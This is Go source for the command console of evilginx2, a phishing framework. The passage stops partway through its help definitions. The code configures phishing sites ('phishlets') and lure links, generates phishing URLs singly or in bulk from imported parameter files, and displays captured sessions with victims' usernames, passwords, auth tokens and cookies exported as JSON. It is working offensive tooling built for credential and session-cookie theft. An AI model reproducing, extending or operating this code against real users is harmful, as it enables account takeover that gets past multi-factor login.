package core

import (
	"bufio"
	"crypto/rc4"
	"encoding/base64"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
	"github.com/kgretzky/evilginx2/parser"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

const (
	DEFAULT_PROMPT = ": "
	LAYER_TOP      = 1
)

type Terminal struct {
	rl        *readline.Instance
	completer *readline.PrefixCompleter
	cfg       *Config
	crt_db    *CertDb
	p         *HttpProxy
	db        *database.Database
	hlp       *Help
	developer bool
}

func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
	var err error
	t := &Terminal{
		cfg:       cfg,
		crt_db:    crt_db,
		p:         p,
		db:        db,
		developer: developer,
	}

	t.createHelp()
	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)

	t.rl, err = readline.NewEx(&readline.Config{
		Prompt:              DEFAULT_PROMPT,
		AutoComplete:        t.completer,
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		FuncFilterInputRune: t.filterInput,
	})
	if err != nil {
		return nil, err
	}
	return t, nil
}

func (t *Terminal) Close() {
	t.rl.Close()
}

func (t *Terminal) output(s string, args ...interface{}) {
	out := fmt.Sprintf(s, args...)
	fmt.Fprintf(color.Output, "\n%s\n", out)
}

func (t *Terminal) DoWork() {
	var do_quit = false

	t.checkStatus()
	log.SetReadline(t.rl)

	t.cfg.refreshActiveHostnames()
	t.manageCertificates(true)

	t.output("%s", t.sprintPhishletStatus(""))
	go t.monitorLurePause()

	for !do_quit {
		line, err := t.rl.Readline()
		if err == readline.ErrInterrupt {
			log.Info("type 'exit' in order to quit")
			continue
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)

		args, err := parser.Parse(line)
		if err != nil {
			log.Error("syntax error: %v", err)
		}

		argn := len(args)
		if argn == 0 {
			t.checkStatus()
			continue
		}

		cmd_ok := false
		switch args[0] {
		case "clear":
			cmd_ok = true
			readline.ClearScreen(color.Output)
		case "config":
			cmd_ok = true
			err := t.handleConfig(args[1:])
			if err != nil {
				log.Error("config: %v", err)
			}
		case "proxy":
			cmd_ok = true
			err := t.handleProxy(args[1:])
			if err != nil {
				log.Error("proxy: %v", err)
			}
		case "sessions":
			cmd_ok = true
			err := t.handleSessions(args[1:])
			if err != nil {
				log.Error("sessions: %v", err)
			}
		case "phishlets":
			cmd_ok = true
			err := t.handlePhishlets(args[1:])
			if err != nil {
				log.Error("phishlets: %v", err)
			}
		case "lures":
			cmd_ok = true
			err := t.handleLures(args[1:])
			if err != nil {
				log.Error("lures: %v", err)
			}
		case "blacklist":
			cmd_ok = true
			err := t.handleBlacklist(args[1:])
			if err != nil {
				log.Error("blacklist: %v", err)
			}
		case "test-certs":
			cmd_ok = true
			t.manageCertificates(true)
		case "help":
			cmd_ok = true
			if len(args) == 2 {
				if err := t.hlp.PrintBrief(args[1]); err != nil {
					log.Error("help: %v", err)
				}
			} else {
				t.hlp.Print(0)
			}
		case "q", "quit", "exit":
			do_quit = true
			cmd_ok = true
		default:
			log.Error("unknown command: %s", args[0])
			cmd_ok = true
		}
		if !cmd_ok {
			log.Error("invalid syntax: %s", line)
		}
		t.checkStatus()
	}
}

func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url"}
		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "domain":
			t.cfg.SetBaseDomain(args[1])
			t.cfg.ResetAllSites()
			t.manageCertificates(false)
			return nil
		case "ipv4":
			t.cfg.SetServerExternalIP(args[1])
			return nil
		case "unauth_url":
			if len(args[1]) > 0 {
				_, err := url.ParseRequestURI(args[1])
				if err != nil {
					return err
				}
			}
			t.cfg.SetUnauthUrl(args[1])
			return nil
		}
	} else if pn == 3 {
		switch args[0] {
		case "ipv4":
			switch args[1] {
			case "external":
				t.cfg.SetServerExternalIP(args[2])
				return nil
			case "bind":
				t.cfg.SetServerBindIP(args[2])
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleBlacklist(args []string) error {
	pn := len(args)
	if pn == 0 {
		mode := t.cfg.GetBlacklistMode()
		ip_num, mask_num := t.p.bl.GetStats()
		log.Info("blacklist mode set to: %s", mode)
		log.Info("blacklist: loaded %d ip addresses and %d ip masks", ip_num, mask_num)

		return nil
	} else if pn == 1 {
		switch args[0] {
		case "all":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "unauth":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "noadd":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		case "off":
			t.cfg.SetBlacklistMode(args[0])
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "log":
			switch args[1] {
			case "on":
				t.p.bl.SetVerbose(true)
				log.Info("blacklist log output: enabled")
				return nil
			case "off":
				t.p.bl.SetVerbose(false)
				log.Info("blacklist log output: disabled")
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleProxy(args []string) error {
	pn := len(args)
	if pn == 0 {
		var proxy_enabled string = "no"
		if t.cfg.proxyConfig.Enabled {
			proxy_enabled = "yes"
		}

		keys := []string{"enabled", "type", "address", "port", "username", "password"}
		vals := []string{proxy_enabled, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, strconv.Itoa(t.cfg.proxyConfig.Port), t.cfg.proxyConfig.Username, t.cfg.proxyConfig.Password}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			err := t.p.setProxy(true, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
			if err != nil {
				return err
			}
			t.cfg.EnableProxy(true)
			log.Important("you need to restart evilginx for the changes to take effect!")
			return nil
		case "disable":
			err := t.p.setProxy(false, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
			if err != nil {
				return err
			}
			t.cfg.EnableProxy(false)
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "type":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyType(args[1])
			return nil
		case "address":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyAddress(args[1])
			return nil
		case "port":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			port, err := strconv.Atoi(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetProxyPort(port)
			return nil
		case "username":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyUsername(args[1])
			return nil
		case "password":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyPassword(args[1])
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleSessions(args []string) error {
	lblue := color.New(color.FgHiBlue)
	dgray := color.New(color.FgHiBlack)
	lgreen := color.New(color.FgHiGreen)
	yellow := color.New(color.FgYellow)
	lyellow := color.New(color.FgHiYellow)
	lred := color.New(color.FgHiRed)
	cyan := color.New(color.FgCyan)
	white := color.New(color.FgHiWhite)

	pn := len(args)
	if pn == 0 {
		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		var rows [][]string
		for _, s := range sessions {
			tcol := dgray.Sprintf("none")
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
				tcol = lgreen.Sprintf("captured")
			}
			row := []string{strconv.Itoa(s.Id), lred.Sprintf(s.Phishlet), lblue.Sprintf(truncateString(s.Username, 24)), lblue.Sprintf(truncateString(s.Password, 24)), tcol, yellow.Sprintf(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
			rows = append(rows, row)
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		return nil
	} else if pn == 1 {
		id, err := strconv.Atoi(args[0])
		if err != nil {
			return err
		}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		s_found := false
		for _, s := range sessions {
			if s.Id == id {
				pl, err := t.cfg.GetPhishlet(s.Phishlet)
				if err != nil {
					log.Error("%v", err)
					break
				}

				s_found = true
				tcol := dgray.Sprintf("empty")
				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
					tcol = lgreen.Sprintf("captured")
				}

				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
				log.Printf("\n%s\n", AsRows(keys, vals))

				if len(s.Custom) > 0 {
					tkeys := []string{}
					tvals := []string{}

					for k, v := range s.Custom {
						tkeys = append(tkeys, k)
						tvals = append(tvals, cyan.Sprint(v))
					}

					log.Printf("[ %s ]\n%s\n", white.Sprint("custom"), AsRows(tkeys, tvals))
				}

				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
					if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
						//var str_tokens string

						tkeys := []string{}
						tvals := []string{}

						for k, v := range s.BodyTokens {
							tkeys = append(tkeys, k)
							tvals = append(tvals, white.Sprint(v))
						}
						for k, v := range s.HttpTokens {
							tkeys = append(tkeys, k)
							tvals = append(tvals, white.Sprint(v))
						}

						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
					}
					if len(s.CookieTokens) > 0 {
						json_tokens := t.cookieTokensToJSON(pl, s.CookieTokens)
						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
					}
				}
				break
			}
		}
		if !s_found {
			return fmt.Errorf("id %d not found", id)
		}
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			if args[1] == "all" {
				sessions, err := t.db.ListSessions()
				if err != nil {
					return err
				}
				if len(sessions) == 0 {
					break
				}
				for _, s := range sessions {
					err = t.db.DeleteSessionById(s.Id)
					if err != nil {
						log.Warning("delete: %v", err)
					} else {
						log.Info("deleted session with ID: %d", s.Id)
					}
				}
				t.db.Flush()
				return nil
			} else {
				rc := strings.Split(args[1], ",")
				for _, pc := range rc {
					pc = strings.TrimSpace(pc)
					rd := strings.Split(pc, "-")
					if len(rd) == 2 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						for i := b_id; i <= e_id; i++ {
							err = t.db.DeleteSessionById(i)
							if err != nil {
								log.Warning("delete: %v", err)
							} else {
								log.Info("deleted session with ID: %d", i)
							}
						}
					} else if len(rd) == 1 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						err = t.db.DeleteSessionById(b_id)
						if err != nil {
							log.Warning("delete: %v", err)
						} else {
							log.Info("deleted session with ID: %d", b_id)
						}
					}
				}
				t.db.Flush()
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handlePhishlets(args []string) error {
	pn := len(args)

	if pn >= 3 && args[0] == "create" {
		pl, err := t.cfg.GetPhishlet(args[1])
		if err == nil {
			params := make(map[string]string)

			var create_ok bool = true
			if pl.isTemplate {
				for n := 3; n < pn; n++ {
					val := args[n]

					sp := strings.Index(val, "=")
					if sp == -1 {
						return fmt.Errorf("set custom parameters for the child phishlet using format 'param1=value1 param2=value2'")
					}
					k := val[:sp]
					v := val[sp+1:]

					params[k] = v

					log.Info("adding parameter: %s='%s'", k, v)
				}
			}

			if create_ok {
				child_name := args[1] + ":" + args[2]
				err := t.cfg.AddSubPhishlet(child_name, args[1], params)
				if err != nil {
					log.Error("%v", err)
				} else {
					t.cfg.SaveSubPhishlets()
					log.Info("created child phishlet: %s", child_name)
				}
			}
			return nil
		} else {
			log.Error("%v", err)
		}
	} else if pn == 0 {
		t.output("%s", t.sprintPhishletStatus(""))
		return nil
	} else if pn == 1 {
		_, err := t.cfg.GetPhishlet(args[0])
		if err == nil {
			t.output("%s", t.sprintPhishletStatus(args[0]))
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			err := t.cfg.DeleteSubPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				return nil
			}
			t.cfg.SaveSubPhishlets()
			log.Info("deleted child phishlet: %s", args[1])
			return nil
		case "enable":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				log.Error("%v", err)
				break
			}
			if pl.isTemplate {
				return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", args[1])
			}
			err = t.cfg.SetSiteEnabled(args[1])
			if err != nil {
				t.cfg.SetSiteDisabled(args[1])
				return err
			}
			t.manageCertificates(true)
			return nil
		case "disable":
			err := t.cfg.SetSiteDisabled(args[1])
			if err != nil {
				return err
			}
			t.manageCertificates(false)
			return nil
		case "hide":
			err := t.cfg.SetSiteHidden(args[1], true)
			if err != nil {
				return err
			}
			return nil
		case "unhide":
			err := t.cfg.SetSiteHidden(args[1], false)
			if err != nil {
				return err
			}
			return nil
		case "get-hosts":
			pl, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			bhost, ok := t.cfg.GetSiteDomain(pl.Name)
			if !ok || len(bhost) == 0 {
				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
			}
			out := ""
			hosts := pl.GetPhishHosts(false)
			for n, h := range hosts {
				if n > 0 {
					out += "\n"
				}
				out += t.cfg.GetServerExternalIP() + " " + h
			}
			t.output("%s\n", out)
			return nil
		}
	} else if pn == 3 {
		switch args[0] {
		case "hostname":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			if ok := t.cfg.SetSiteHostname(args[1], args[2]); ok {
				t.cfg.SetSiteDisabled(args[1])
				t.manageCertificates(false)
			}
			return nil
		case "unauth_url":
			_, err := t.cfg.GetPhishlet(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetSiteUnauthUrl(args[1], args[2])
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleLures(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	higreen := color.New(color.FgHiGreen)
	green := color.New(color.FgGreen)
	//hiwhite := color.New(color.FgHiWhite)
	hcyan := color.New(color.FgHiCyan)
	cyan := color.New(color.FgCyan)
	dgray := color.New(color.FgHiBlack)
	white := color.New(color.FgHiWhite)

	pn := len(args)

	if pn == 0 {
		// list lures
		t.output("%s", t.sprintLures())
		return nil
	}
	if pn > 0 {
		switch args[0] {
		case "create":
			if pn == 2 {
				_, err := t.cfg.GetPhishlet(args[1])
				if err != nil {
					return err
				}
				l := &Lure{
					Path:     "/" + GenRandomString(8),
					Phishlet: args[1],
				}
				t.cfg.AddLure(args[1], l)
				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "get-url":
			if pn >= 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				pl, err := t.cfg.GetPhishlet(l.Phishlet)
				if err != nil {
					return fmt.Errorf("get-url: %v", err)
				}
				bhost, ok := t.cfg.GetSiteDomain(pl.Name)
				if !ok || len(bhost) == 0 {
					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
				}

				var base_url string
				if l.Hostname != "" {
					base_url = "https://" + l.Hostname + l.Path
				} else {
					purl, err := pl.GetLureUrl(l.Path)
					if err != nil {
						return err
					}
					base_url = purl
				}

				var phish_urls []string
				var phish_params []map[string]string
				var out string

				params := url.Values{}
				if pn > 2 {
					if args[2] == "import" {
						if pn < 4 {
							return fmt.Errorf("get-url: no import path specified")
						}
						params_file := args[3]

						phish_urls, phish_params, err = t.importParamsFromFile(base_url, params_file)
						if err != nil {
							return fmt.Errorf("get_url: %v", err)
						}

						if pn >= 5 {
							if args[4] == "export" {
								if pn == 5 {
									return fmt.Errorf("get-url: no export path specified")
								}
								export_path := args[5]

								format := "text"
								if pn == 7 {
									format = args[6]
								}

								err = t.exportPhishUrls(export_path, phish_urls, phish_params, format)
								if err != nil {
									return fmt.Errorf("get-url: %v", err)
								}
								out = hiblue.Sprintf("exported %d phishing urls to file: %s\n", len(phish_urls), export_path)
								phish_urls = []string{}
							} else {
								return fmt.Errorf("get-url: expected 'export': %s", args[4])
							}
						}

					} else {
						// params present
						for n := 2; n < pn; n++ {
							val := args[n]

							sp := strings.Index(val, "=")
							if sp == -1 {
								return fmt.Errorf("to set custom parameters for the phishing url, use format 'param1=value1 param2=value2'")
							}
							k := val[:sp]
							v := val[sp+1:]

							params.Add(k, v)

							log.Info("adding parameter: %s='%s'", k, v)
						}
						phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
					}
				} else {
					phish_urls = append(phish_urls, t.createPhishUrl(base_url, &params))
				}

				for n, phish_url := range phish_urls {
					out += hiblue.Sprint(phish_url)

					var params_row string
					var params string
					if len(phish_params) > 0 {
						params_row := phish_params[n]
						m := 0
						for k, v := range params_row {
							if m > 0 {
								params += " "
							}
							params += fmt.Sprintf("%s=\"%s\"", k, v)
							m += 1
						}
					}

					if len(params_row) > 0 {
						out += " ; " + params
					}
					out += "\n"
				}

				t.output("%s", out)
				return nil
			}
			return fmt.Errorf("incorrect number of arguments")
		case "pause":
			if pn == 3 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				s_duration := args[2]

				t_dur, err := ParseDurationString(s_duration)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				t_now := time.Now()
				log.Info("current time: %s", t_now.Format("2006-01-02 15:04:05"))
				log.Info("unpauses at:  %s", t_now.Add(t_dur).Format("2006-01-02 15:04:05"))

				l.PausedUntil = t_now.Add(t_dur).Unix()
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "unpause":
			if pn == 2 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("pause: %v", err)
				}

				log.Info("lure for phishlet '%s' unpaused", l.Phishlet)

				l.PausedUntil = 0
				err = t.cfg.SetLure(l_id, l)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				return nil
			}
		case "edit":
			if pn == 4 {
				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				l, err := t.cfg.GetLure(l_id)
				if err != nil {
					return fmt.Errorf("edit: %v", err)
				}
				val := args[3]
				do_update := false

				switch args[2] {
				case "hostname":
					if val != "" {
						val = strings.ToLower(val)

						if val != t.cfg.general.Domain && !strings.HasSuffix(val, "."+t.cfg.general.Domain) {
							return fmt.Errorf("edit: lure hostname must end with the base domain '%s'", t.cfg.general.Domain)
						}
						host_re := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
						if !host_re.MatchString(val) {
							return fmt.Errorf("edit: invalid hostname")
						}

						l.Hostname = val
						t.cfg.refreshActiveHostnames()
						t.manageCertificates(true)
					} else {
						l.Hostname = ""
					}
					do_update = true
					log.Info("hostname = '%s'", l.Hostname)
				case "path":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						l.Path = u.EscapedPath()
						if len(l.Path) == 0 || l.Path[0] != '/' {
							l.Path = "/" + l.Path
						}
					} else {
						l.Path = "/"
					}
					do_update = true
					log.Info("path = '%s'", l.Path)
				case "redirect_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: redirect url must be absolute")
						}
						l.RedirectUrl = u.String()
					} else {
						l.RedirectUrl = ""
					}
					do_update = true
					log.Info("redirect_url = '%s'", l.RedirectUrl)
				case "phishlet":
					_, err := t.cfg.GetPhishlet(val)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					l.Phishlet = val
					do_update = true
					log.Info("phishlet = '%s'", l.Phishlet)
				case "info":
					l.Info = val
					do_update = true
					log.Info("info = '%s'", l.Info)
				case "og_title":
					l.OgTitle = val
					do_update = true
					log.Info("og_title = '%s'", l.OgTitle)
				case "og_desc":
					l.OgDescription = val
					do_update = true
					log.Info("og_desc = '%s'", l.OgDescription)
				case "og_image":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: image url must be absolute")
						}
						l.OgImageUrl = u.String()
					} else {
						l.OgImageUrl = ""
					}
					do_update = true
					log.Info("og_image = '%s'", l.OgImageUrl)
				case "og_url":
					if val != "" {
						u, err := url.Parse(val)
						if err != nil {
							return fmt.Errorf("edit: %v", err)
						}
						if !u.IsAbs() {
							return fmt.Errorf("edit: site url must be absolute")
						}
						l.OgUrl = u.String()
					} else {
						l.OgUrl = ""
					}
					do_update = true
					log.Info("og_url = '%s'", l.OgUrl)
				case "redirector":
					if val != "" {
						path := val
						if !filepath.IsAbs(val) {
							redirectors_dir := t.cfg.GetRedirectorsDir()
							path = filepath.Join(redirectors_dir, val)
						}

						if _, err := os.Stat(path); !os.IsNotExist(err) {
							l.Redirector = val
						} else {
							return fmt.Errorf("edit: redirector directory does not exist: %s", path)
						}
					} else {
						l.Redirector = ""
					}
					do_update = true
					log.Info("redirector = '%s'", l.Redirector)
				case "ua_filter":
					if val != "" {
						if _, err := regexp.Compile(val); err != nil {
							return err
						}

						l.UserAgentFilter = val
					} else {
						l.UserAgentFilter = ""
					}
					do_update = true
					log.Info("ua_filter = '%s'", l.UserAgentFilter)
				}
				if do_update {
					err := t.cfg.SetLure(l_id, l)
					if err != nil {
						return fmt.Errorf("edit: %v", err)
					}
					return nil
				}
			} else {
				return fmt.Errorf("incorrect number of arguments")
			}
		case "delete":
			if pn == 2 {
				if len(t.cfg.lures) == 0 {
					break
				}
				if args[1] == "all" {
					di := []int{}
					for n := range t.cfg.lures {
						di = append(di, n)
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				} else {
					rc := strings.Split(args[1], ",")
					di := []int{}
					for _, pc := range rc {
						pc = strings.TrimSpace(pc)
						rd := strings.Split(pc, "-")
						if len(rd) == 2 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							for i := b_id; i <= e_id; i++ {
								di = append(di, i)
							}
						} else if len(rd) == 1 {
							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
							if err != nil {
								return fmt.Errorf("delete: %v", err)
							}
							di = append(di, b_id)
						}
					}
					if len(di) > 0 {
						rdi := t.cfg.DeleteLures(di)
						for _, id := range rdi {
							log.Info("deleted lure with ID: %d", id)
						}
					}
					return nil
				}
			}
			return fmt.Errorf("incorrect number of arguments")
		default:
			id, err := strconv.Atoi(args[0])
			if err != nil {
				return err
			}
			l, err := t.cfg.GetLure(id)
			if err != nil {
				return err
			}

			var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

			keys := []string{"phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "info", "og_title", "og_desc", "og_image", "og_url"}
			vals := []string{hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, l.Info, dgray.Sprint(l.OgTitle), dgray.Sprint(l.OgDescription), dgray.Sprint(l.OgImageUrl), dgray.Sprint(l.OgUrl)}
			log.Printf("\n%s\n", AsRows(keys, vals))

			return nil
		}
	}

	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) monitorLurePause() {
	var pausedLures map[string]int64
	pausedLures = make(map[string]int64)

	for {
		t_cur := time.Now()

		for n, l := range t.cfg.lures {
			if l.PausedUntil > 0 {
				l_id := t.cfg.lureIds[n]
				t_pause := time.Unix(l.PausedUntil, 0)
				if t_pause.After(t_cur) {
					pausedLures[l_id] = l.PausedUntil
				} else {
					if _, ok := pausedLures[l_id]; ok {
						log.Info("[%s] lure (%d) is now active", l.Phishlet, n)
					}
					pausedLures[l_id] = 0
					l.PausedUntil = 0
				}
			}
		}

		time.Sleep(500 * time.Millisecond)
	}
}

func (t *Terminal) createHelp() {
	h, _ := NewHelp()
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("wildcards")))
	h.AddSubCommand("config", nil, "", "show all configuration variables")
	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")

	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
	h.AddSubCommand("proxy", nil, "", "show all configuration variables")
	h.AddSubCommand("proxy", []string{"enable"}, "enable", "enable proxy")
	h.AddSubCommand("proxy", []string{"disable"}, "disable", "disable proxy")
	h.AddSubCommand("proxy", []string{"type"}, "type <type>", "set proxy type: http (default), https, socks5, socks5h")
	h.AddSubCommand("proxy", []string{"address"}, "address <address>", "set proxy address")
	h.AddSubCommand("proxy", []string{"port"}, "port <port>", "set proxy port")
	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set proxy authentication username")
	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set proxy authentication password")

	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
		readline.PcItem("phishlets", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("delete", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
